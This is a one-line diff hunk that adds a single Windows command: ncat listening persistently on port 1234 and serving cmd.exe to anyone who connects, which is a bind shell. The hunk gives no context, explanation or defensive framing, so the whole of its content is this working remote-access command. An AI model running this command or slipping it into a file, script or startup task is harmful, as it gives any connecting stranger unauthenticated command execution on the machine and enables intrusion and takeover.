@@ -1,0 +1,1 @@
+ncat.exe  -k -lvp 1234 -e cmd.exe  
